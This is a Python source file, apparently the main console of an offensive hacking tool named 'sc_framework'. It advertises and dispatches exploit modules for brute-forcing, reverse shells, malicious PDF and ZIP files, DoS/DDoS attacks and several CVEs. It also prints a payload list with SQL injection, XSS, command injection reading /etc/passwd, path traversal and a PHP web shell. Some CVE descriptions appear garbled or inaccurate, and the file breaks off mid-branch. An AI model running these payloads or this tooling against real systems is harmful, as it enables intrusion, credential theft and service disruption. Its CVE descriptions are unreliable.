# This tool haves some tools in /sc_framework/tools/ .
# haves some exploit and wireless attack tools in /tools/ directory.
# DISCLAMER! : Every risk you done with this tool, is on your own sholder.
# imports

import os
import time
import random
import signal
import sys
from exploits import *
from payloads import *
from tools import *

#colors
class color:
    red = '\33[91m'
    blue = '\033[94m'
    white = '\033[0m'
    underline = '\033[4m'
    green = '\033[92m'
    warning = '\033[93m'

def signal_handler(sig, frame):

    print()
    print("\nCtrl+C pressed, exiting...")

    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

def start():
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting Sc console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sC console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc Console...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc cOnsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc coNsole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc conSole...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consOle...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consoLe...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc consolE...")
    time.sleep(0.3)
    os.system('clear')
    print("starting sc console...")
    time.sleep(0.3)
    os.system('clear')


def Menu():
    list = [color.green + """
                                                                                    *  *    *
         o O o                                                                       * ______   *
                o O                                                                   |      |* 
                   o                  |''''''''''''|=========[***  ***  ***  ***      |""" + color.red + """error!""" + color.green + """|
  |^^^^^^^^^^^^^^^|]___               |  """ + color.green + """EXPLOIT   \                                * |______|  *
  |    """ + color.red + """PAYLOAD""" + color.green + """      |""\___,          |_____________\_______                             ||*
  |_________________|__|)__|          |==[""" + color.white + """sc~>""" + color.green + """ ]============\                       * |""" + color.warning + """target""" + color.green + """| *
  |(@)(@)'''***|(@)(@)**|(@)          |_____________________\\
                                      \(O)(O)(O)(O)(O)(O)(O)/
""",
color.red + """
 ▄▀▀▀▀▄  ▄▀▄▄▄▄  
█ █   ▐ █ █    ▌ 
   ▀▄   ▐ █      
▀▄   █    █      
 █▀▀▀    ▄▀▄▄▄▄▀ 
 ▐      █     ▐  
        ▐        

 ▄▀▀▀█▄    ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄    ▄▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▀▄ █ 
█  ▄▀  ▀▄ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ ▐  ▄▀   ▐ █   █    ▐  █ █      █ █   █   █ █  █ ▄▀ 
▐ █▄▄▄▄   ▐  █▀▀█▀    █▄▄▄█ ▐  █    █   █▄▄▄▄▄  ▐  █        █ █      █ ▐  █▀▀█▀  ▐  █▀▄  
 █    ▐    ▄▀    █   ▄▀   █   █    █    █    ▌    █   ▄    █  ▀▄    ▄▀  ▄▀    █    █   █ 
 █        █     █   █   ▄▀  ▄▀   ▄▀    ▄▀▄▄▄▄      ▀▄▀ ▀▄ ▄▀    ▀▀▀▀   █     █   ▄▀   █  
█         ▐     ▐   ▐   ▐   █    █     █    ▐            ▀             ▐     ▐   █    ▐  
▐                           ▐    ▐     ▐                                         ▐       
""",
color.green + """
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
              ┬              ┌─┐┌─┐                ┬
              │              └─┐│                  │
              o              └─┘└─┘                o
              ┬    ┌─┐┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─     ┬ 
              │    ├┤ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐     │ 
              o    └  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴     o 
              ┬                                    ┬
              │────────────────────────────────────│
              o                                    o
""",
color.warning + """
                    .▄▄ ·  ▄▄·                                 
                    ▐█ ▀. ▐█ ▌▪                                
                    ▄▀▀▀█▄██ ▄▄                                
                    ▐█▄▪▐█▐███▌                                
                     ▀▀▀▀ ·▀▀▀                                 
    ·▄▄▄▄▄▄   ▄▄▄· • ▌ ▄ ·. ▄▄▄ .▄▄▌ ▐ ▄▌      ▄▄▄  ▄ •▄       
    ▐▄▄·▀▄ █·▐█ ▀█ ·██ ▐███▪▀▄.▀·██· █▌▐█▪     ▀▄ █·█▌▄▌▪      
    ██▪ ▐▀▀▄ ▄█▀▀█ ▐█ ▌▐▌▐█·▐▀▀▪▄██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ▐▀▀▄·      
    ██▌.▐█•█▌▐█ ▪▐▌██ ██▌▐█▌▐█▄▄▌▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█.█▌      
    ▀▀▀ .▀  ▀ ▀  ▀ ▀▀  █▪▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀·▀  ▀      
""",
color.blue + """
                     ______
             \    .-        -. 
     __<@\_______/            \__________________________________
  (I)___|________}  .-.  .-.  ,{____framework___________________/
       <@/      | )(_S/  \C_)( |  
                |/     /\     \|     / 
                <__    ^^    __>
                 \__|IIIIII|__/
                  \ \      / / 
                   \ IIIIII /
                    -------- 
""",
color.red + """
                                              .------..------.          
 .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  .-.  |S.--. ||C.--. |          
((5))((5))((5))((5))((5))((5))((5))((5))((5)) | :/\: || :/\: |          
 '-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.'-.-.| :\/: || :\/: |          
  ((1))((1))((1))((1))((1))((1))((1))((1))((1)) '--'S|| '--'C|          
   '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'  '-'`------'`------'          
.------..------..------..------..------..------..------..------..------.
|F.--. ||R.--. ||A.--. ||M.--. ||E.--. ||W.--. ||O.--. ||R.--. ||K.--. |
| :(): || :(): || (\/) || (\/) || (\/) || :/\: || :/\: || :(): || :/\: |
| ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() || :\/: |
| '--'F|| '--'R|| '--'A|| '--'M|| '--'E|| '--'W|| '--'O|| '--'R|| '--'K|
`------'`------'`------'`------'`------'`------'`------'`------'`------'
""",
"""
000000000000""" + color.warning + """1      1""" + color.white + """0000000000000000000000000000
       000000""" + color.warning + """1""" + color.white + """0000""" + color.warning + """1""" + color.white + """0000000000000000
  000""" + color.warning + """1""" + color.white + """0000000""" + color.warning + """111111""" + color.white + """00000000""" + color.warning + """1""" + color.white + """
     """ + color.warning + """11""" + color.white + """0000""" + color.warning + """1111111111""" + color.white + """00000""" + color.warning + """11""" + color.white + """
    00""" + color.warning + """11""" + color.white + """00""" + color.warning + """111111111111""" + color.white + """000""" + color.warning + """11""" + color.white + """000
    000""" + color.warning + """1111111111111111111""" + color.white + """000000000000
0000000  """ + color.red + """CVE-2022-24521""" + color.white + """  000000000000000000000000000000000000000
   00000""" + color.warning + """11111111111111111""" + color.white + """000
00000000""" + color.warning + """11111111111111111""" + color.white + """000000000
   0000""" + color.warning + """1111111111111111111""" + color.white + """000000
  0000""" + color.warning + """11""" + color.white + """00""" + color.warning + """1111111111111""" + color.white + """00""" + color.warning + """11""" + color.white + """000000000000
00000""" + color.warning + """11""" + color.white + """000000""" + color.warning + """1111111""" + color.white + """000000""" + color.warning + """11""" + color.white + """000000
   00""" + color.warning + """1""" + color.white + """000000000000000000000""" + color.warning + """1""" + color.white + """000000000000000000
"""]
    random_banner = random.choice(list)
    print(random_banner)
    print()
    print()
    print(color.white + "        +[ " + color.red + "sc_framework v1.1" + color.white + "                          ]+")
    print("        *[ 37 exploits / 18 cve exploits / 10 payloads ]")
    print()
    print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
    print()
    Console()


def Console():
    scconsole = input("sc~>")
    if scconsole == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
use <exploit> ---> to use the exploit.
search ---> to see the search options.
exit ---> to exit from sc-console.
show payloads ---> to see avalable payloads in sc-framework.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
""")
    elif scconsole == "h":
        print("""
help ---> to see the full help menu.
clear ---> to clear the screen.
search ---> to see the search options.
exit ---> to exit from sc-console.
use system commands ---> to use system tools and commands 3 times, to come back here use (back to sc-console).
""")
    elif scconsole == "show options":
        print("""
PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
""")
    elif scconsole == "clear":
        os.system('clear')
    elif scconsole == "search":
        print("""
search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi | server | dos | php>        
""")
    elif scconsole == "search exploits":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """windows/java-rhino""" + color.white + """                                  24/01/12 02:45       for excuteshellcommand http port.
""" + color.red + """site/tomcat-mgr-login""" + color.white + """                               24/01/12 04:23       for brute force login pages.
""" + color.red + """windows/ms17-010-psexec""" + color.white + """                             24/01/13 08:20       for brute force windows smb port.
""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                          24/01/13 10:39       for execute the command with elevated privileges on the target.
""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                    24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
""" + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """                              24/01/14 09:35       to try passwords, sql injection, xss, php on the taregt login-page.
""" + color.red + """site/vuln-curl-website""" + color.white + """                              24/01/14 11:40       for finding vulnerabilite in the target website.
""" + color.red + """site/find-vulnerabilites-website2""" + color.white + """                   24/01/14 12:31       for finding vulnerabilite with payload you specified.
""" + color.red + """site/ZIP-exploit""" + color.white + """                                    24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
""" + color.red + """windows/PDF-exploit""" + color.white + """                                 24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
""" + color.red + """exploit/ssh-version""" + color.white + """                                 24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
""" + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """site/http-login-test""" + color.white + """                                24/01/19 12:01       for login on port 80 http port.
""" + color.red + """exploit/reverse-shell""" + color.white + """                               24/01/20 01:12       for get a reverse shell by sending a link.
""" + color.red + """exploit/handler/handler""" + color.white + """                             24/01/22 02:34       for listen on the target to open the exploit2.php.
""" + color.red + """exploit/handler/listining""" + color.white + """                           24/01/22 04:12       for listen on the target to open the exploit.php.
""" + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """               23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
""" + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """ 23/09/29 02:19       allow to test the target to find cve-2023-22518 vulnerabilitie.
""" + color.red + """dos/DD_D_Attack""" + color.white + """                                     25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """                         25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
""" + color.red + """site/Directory-finder""" + color.white + """                               25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys.
""" + color.red + """site/struts2_namespace_ognl""" + color.white + """                         25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
""" + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06 02:03       provides a reverse shell payload that can be used to establish a reverse shell connection.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10       This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30       extract sensitive information with the payloads have, extract informations like tables, columns, databases.
""" + color.red + """site/cve-2022-24521""" + color.white + """                                 22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
""" + color.red + """site/information-gather""" + color.white + """                             25/02/17 12:40       gets the information from the website like some links, some images, some more information.
""" + color.red + """site/port-scan"""  + color.white + """                                      25/02/17 01:15       Scans for open ports (work normaly!).
""" + color.red + """dos/ciscodos""" + color.white + """                                        03/07/22 10:07       Remote DoS against the recent Cisco IOS vuln.
""" + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """           04/02/14 04/37       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
""" + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05 12:17       tcpdump - ISAKMP Identification Payload Integer Overflow.
""" + color.red + """php/RCE_via_PHP""" + color.white + """                                     25/02/18 12:53       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
""")
    elif scconsole == "search exploit":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """exploit/bypassuac-eventvwr""" + color.white + """                          24/01/13 10:39       for execute the command with elevated privileges on the target.
""" + color.red + """exploit/find-vulnerabilites-scan""" + color.white + """                    24/01/14 09:24       for scanning target and finds vulnerabilite on target machine.
""" + color.red + """exploit/ssh-version""" + color.white + """                                 24/01/18 08:32       for scan the ssh port 22, to scan it the port 22 is up or down if it is up shows the version to you.
""" + color.red + """exploit/reverse-shell""" + color.white + """                               24/01/20 01:12       for get a reverse shell by sending a link.
""" + color.red + """exploit/handler/handler""" + color.white + """                             24/01/22 02:34       for listen on the target to open the exploit2.php.
""" + color.red + """exploit/handler/listining""" + color.white + """                           24/01/22 04:12       for listen on the target to open the exploit.php.
""" + color.red + """exploit/cve-2023-22518/cve-2023-22518""" + color.white + """               23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.
""" + color.red + """exploit/cve-2023-22518/vuln-test-for-cve-2023-22518""" + color.white + """ 23/09/29 02:19       allow to test the target to find cve-2023-22518 vulnerabilitie.
""")
    elif scconsole == "search windows":
        print("""
    Exploits                              When created?        Discrepstion 
""" + color.red + """windows/PDF-exploit""" + color.white + """                       24/01/18 04:43       for genrate a pdf file, then send the pdf file to your target, when opened, you geted reverse shell.
""" + color.red + """windows/ftp-login-test""" + color.white + """                    24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """windows/java-rhino""" + color.white + """                        24/01/12 02:45       for excuteshellcommand http port.
""" + color.red + """windows/ms17-010-psexec""" + color.white + """                   24/01/13 08:20       for brute force windows smb port.
""" + color.red + """windows/ssh-login-test""" + color.white + """                    24/01/11 05:54       for brute forcing ssh port.
""" + color.red + """windows/7-zip_cve-2025-0411""" + color.white + """               25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.
""" + color.red + """windows/MS04-007_LSASS-exe_Pro_Remote_DoS""" + color.white + """ 04/02/14 04/37       Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007).
""")
    elif scconsole == "search site":
        print("""
    Exploits                         When created?        Discrepstion 
""" + color.red + """site/XSS-SQLi-PHP-PASS""" + color.white + """               24/01/14 09:35       for alert the XSS attack in html file.
""" + color.red + """site/vuln-curl-website""" + color.white + """               24/01/14 11:40       for finding vulnerabilite in the target website.
""" + color.red + """site/find-vulnerabilites-website2""" + color.white + """    24/01/14 12:31       for finding vulnerabilite with payload you specified.
""" + color.red + """site/http-login-test""" + color.white + """                 24/01/19 12:01       for login on port 80 http port.
""" + color.red + """site/ZIP-exploit""" + color.white + """                     24/01/16 01:49       for genrate a zip file, then send the zip file to your target website, when unziped, you geted reverse shell.
""" + color.red + """site/tomcat-mgr-login""" + color.white + """                24/01/12 04:23       for brute force login pages.
""" + color.red + """site/Directory-finder""" + color.white + """                25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys (works slow).
""" + color.red + """site/struts2_namespace_ognl""" + color.white + """          25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
""" + color.red + """site/reverse_http""" + color.white + """                    25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
""" + color.red + """site/cve-2022-24521""" + color.white + """                  22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
""" + color.red + """site/information-gather""" + color.white + """              25/02/17 12:40       gets the information from the website like some links, some images, some more information.
""" + color.red + """site/port-scan"""  + color.white + """                      25/02/17 01:15       Scans for open ports (work normaly!).
""")
    elif scconsole == "search cve-exploits":
        print()
        print("    Exploits                                           When created?        Discrepstion")
        print(color.red + "tools/cve-exploits/SOPlanning-1_52_01-52082" + color.white + "            25/01/12 08:14       Simple Online Planning Tool - Remote Code Execution (RCE) (Authenticated).")
        print(color.red + "tools/cve-exploits/TCP-IP-DoS-52075" + color.white + "                    25/01/11 01:34       Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service.")
        print(color.red + "tools/cve-exploits/http-post-request_cve-2024-48871" + color.white + "    24/04/18 03:40       uses the Flask framework to create a web server with an endpoint that executes arbitrary commands received from the client.")
        print(color.red + "tools/cve-exploits/http-request_cve-2024-52320" + color.white + "         24/04/16 05:45       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.")
        print(color.red + "tools/cve-exploits/http-request_cve-2024-52558" + color.white + "         24/04/15 04:53       creates a payload that includes padding, NSEH, SEH, more padding, and shellcode. The payload is then sent to the target IP and port using a socket connection.")
        print(color.red + "tools/cve-exploits/ipv6_cve-2024-38106" + color.white + "                 24/04/12 01:12       Windows IPv6 exploit.")
        print(color.red + "tools/cve-exploits/wordfence_cve-2024-8543" + color.white + "             25/01/09 12:39       This is an exploit for a Cross-Site Scripting (XSS) vulnerability in the Slider Comparison Image plugin for WordPress.")
        print(color.red + "tools/cve-exploits/OpenSSH_5-3_32bit_86x_0day" + color.white + "          19/02/01 10:50       OpenSSH 5.3 32-bit x86 remote root 0day exploit.")
        print(color.red + "tools/cve-exploits/OpenSSH_5-3p1_cve-2022-28123" + color.white + "        22/04/08 11:21       OpenSSH 5.3p1 cve-2022-28123 exploit.")
        print(color.red + "tools/cve-exploits/cve-2023-22518" + color.white + "                      23/09/29 02:19       allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance.")
        print(color.red + "tools/cve-exploits/7-zip_cve-2025-0411" + color.white + "                 25/02/04 04:18       This flaw bypasses Windows' MotW protections, allowing remote code execution via malicious archives.")
        print(color.red + "tools/PCMan_FTP_Server-2_0-pwd_Remote_Buffer_Overflow" + color.white + "  23/09/25 07:11       PCMan FTP Server 2.0 pwd Remote Buffer Overflow.")
        print(color.red + "tools/Heartbleed_cve-2014-0160" + color.white + "                         14/04/12 12:03       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.")
        print(color.red + "tools/POODLE_cve-2014-3566" + color.white + "                             14/02/06 05:07       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.")
        print(color.red + "tools/Slammer_cve-2007-5391" + color.white + "                            07/05/23 01:12       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.")
        print(color.red + "tools/cve-2022-24521" + color.white + "                                   22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.")
        print(color.red + "tools/cve-2010-2730" + color.white + "                                    10/06/12 07:11       Buffer overflow in Microsoft Internet Information Services (IIS) 7.5, when FastCGI is enabled, allows remote attackers to execute arbitrary code via crafted headers in a request.")
        print()
        print("You can't run these exploits from here, you need to run them from ",os.getcwd(),"/tools/cve-exploits/")
        print()
    elif scconsole == "search multi":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """multi/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """multi/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06 02:03       provides a reverse shell payload that can be used to establish a reverse shell connection.
""")
    elif scconsole == "search osx":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """osx/ssh-login-test""" + color.white + """                                  24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """osx/ftp-login-test""" + color.white + """                                  24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""" + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
""")
    elif scconsole == "search linux":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """linux/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
""" + color.red + """linux/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
""" + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
""" + color.red + """linux/tcpdump_packet_sniffer""" + color.white + """                        04/04/05 12:17       tcpdump - ISAKMP Identification Payload Integer Overflow.
""")
    elif scconsole == "search server":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
""" + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30        extract sensitive information with the payloads have, extract informations like tables, columns, databases.
""")
    elif scconsole == "search dos":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """dos/ciscodos""" + color.white + """                                            03/07/22 10:07       Remote DoS against the recent Cisco IOS vuln.
""" + color.red + """dos/DD_D_Attack""" + color.white + """                                         25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
""")
    elif scconsole == "search php":
        print("""
    Exploits                                        When created?        Discrepstion 
""" + color.red + """php/RCE_via_PHP""" + color.white + """                                         25/02/18 12:53       This exploit exploits a vulnerability in a PHP application that allows arbitrary code execution on the server.
""")
    elif scconsole == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.

""" + color.green + """<script>alert('XSS')</script>""" + color.white + """  ---> cross site XSS alert payload.

""" + color.green + """<img src=x onerror=alert('XSS')>""" + color.white + """  ---> cross site XSS onerror payload.

""" + color.green + """;whoami""" + color.white + """  ---> remote code execute whoami payload.

""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.

""" + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.

""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.

""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
""")
    elif scconsole == "use exploit/bypassuac-eventvwr":
        time.sleep(0.5)
        print("using exploit/bypassuac-eventvwr.")
        exploitbypassuaceventvwr()
    elif scconsole == "use exploit/find-vulnerabilites-scan":
        time.sleep(0.5)
        print("using exploit/find-vulnerabilites-scan.")
        exploitfindvulnerabilitesscan()
    elif scconsole == "use exploit/ssh-version":
        time.sleep(0.5)
        print("using exploit/ssh-version.")
        exploitsshversion()
    elif scconsole == "use exploit/reverse-shell":
        time.sleep(0.5)
        print("using exploit/reverse-shell.")
        exploitreverseshell()
    elif scconsole == "use exploit/handler/handler":
        time.sleep(0.5)
        print("using exploit/handler/handler.")
        exploithandlerhandler()
    elif scconsole == "use exploit/handler/listining":
        time.sleep(0.5)
        print("using exploit/handler/listining.")
        exploithandlerlistining()
    elif scconsole == "use exploit/cve-2023-22518/cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/cve-2023-22518.")
        exploitcve202322518cve202322518()
    elif scconsole == "use exploit/cve-2023-22518/vuln-test-for-cve-2023-22518":
        time.sleep(0.5)
        print("using exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
        exploitvulncve202322518cve202322518()
    elif scconsole == "use windows/ssh-login-test":
        time.sleep(0.5)
        print("using windows/ssh-login-test.")
        wexploitsshlogintest()
    elif scconsole == "use windows/java-rhino":
        time.sleep(0.5)
        print("using windows/java-rhino.")
        wexploitjavarhino()
    elif scconsole == "use windows/ms17-010-psexec":
        time.sleep(0.5)
        print("using windows/ms17-010-psexec.")
        wexploitms17010psexec()
    elif scconsole == "use windows/PDF-exploit":
        time.sleep(0.5)
        print("using windows/PDF-exploit.")
        wexploitPDFexploit()
    elif scconsole == "use windows/ftp-login-test":
        time.sleep(0.5)
        print("using windows/ftp-login-test.")
        wexploitftplogintest()
    elif scconsole == "use windows/7-zip_cve-2025-0411":
        time.sleep(0.5)
        print("using windows/7-zip_cve-2025-0411.")
        w7zipcve20250411()
    elif scconsole == "use site/XSS-SQLi-PHP-PASS":
        time.sleep(0.5)
        print("using site/XSS-SQLi-PHP-PASS.")
        texploitXSS()
    elif scconsole == "use dos/DD_D_Attack":
        time.sleep(0.5)
        print("using dos/DD_D_Attack.")
        texploitDDDAttack()
    elif scconsole == "use site/vuln-curl-website":
        time.sleep(0.5)
        print("using site/vuln-curl-website.")
        texploitfindvulnerabiliteswebsite()
    elif scconsole == "use site/find-vulnerabilites-website2":
        time.sleep(0.5)
        print("using site/find-vulnerabilites-website2.")
        texploitfindvulnerabiliteswebsite2()
    elif scconsole == "use site/http-login-test":
        time.sleep(0.5)
        print("using site/http-login-test.")
        texploithttplogintest()
    elif scconsole == "use site/ZIP-exploit":
        time.sleep(0.5)
        print("using site/ZIP-exploit.")
        texploitZIPexploit()
    elif scconsole == "use site/tomcat-mgr-login":
        time.sleep(0.5)
        print("using site/tomcat-mgr-login.")
        texploittomcatmgrlogin()
    elif scconsole == "use site/Directory-finder":
        time.sleep(0.5)
        print("using site/Directory-finder.")
        tdirectoryfinder()
    elif scconsole == "use site/struts2_namespace_ognl":
        time.sleep(0.5)
        print("using site/struts2_namespace_ognl.")
        tstruts2namespaceognl()
    elif scconsole == "use multi/ssh-login-test":
        time.sleep(0.5)
        print("using multi/ssh-login-test.")
        mexploitsshlogintest()
    elif scconsole == "use multi/ftp-login-test":
        time.sleep(0.5)
        print("using multi/ftp-login-test.")
        mexploitftplogintest()
    elif scconsole == "use multi/shell_reverse_tcp":
        time.sleep(0.5)
        print("using multi/shell_reverse_tcp.")
        mexploitreverseshell()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc.")
        osxkernelxnuipfragmentprivesc()
    elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc_2":
        time.sleep(0.5)
        print("using osx/kernel_xnu_ip_fragment_privesc_2.")
        osxkernelxnuipfragmentprivesc2()
    elif scconsole == "use osx/ssh-login-test":
        time.sleep(0.5)
        print("using osx/ssh-login-test.")
        oexploitsshlogintest()
    elif scconsole == "use osx/ftp-login-test":
        time.sleep(0.5)
        print("using osx/ftp-login-test.")
        oexploitftplogintest()
    elif scconsole == "use linux/ssh-login-test":
        time.sleep(0.5)
        print("using linux/ssh-login-test.")
        lexploitsshlogintest()
    elif scconsole == "use linux/ftp-login-test":
        time.sleep(0.5)
        print("using linux/ftp-login-test.")
        lexploitftplogintest()
    elif scconsole == "use site/reverse_http":
        time.sleep(0.5)
        print("using site/reverse_http.")
        treversehttp()
    elif scconsole == "use server/browser_autopwn2":
        time.sleep(0.5)
        print("using server/browser_autopwn2.")
        sserverbrowserautopwn2()
    elif scconsole == "use server/extract_table_db_column":
        time.sleep(0.5)
        print("using server/extract_table_db_column.")
        sserverextracttabledbcolumn()
    elif scconsole == "use linux/vulnerability-find":
        time.sleep(0.5)
        print("using linux/vulnerability-find.")
        lexploitvulnerabilityfind()
    elif scconsole == "use site/cve-2022-24521":
        time.sleep(0.5)
        print("using site/cve-2022-24521.")
        tcve202224521()
    elif scconsole == "use site/information-gather":
        time.sleep(0.5)
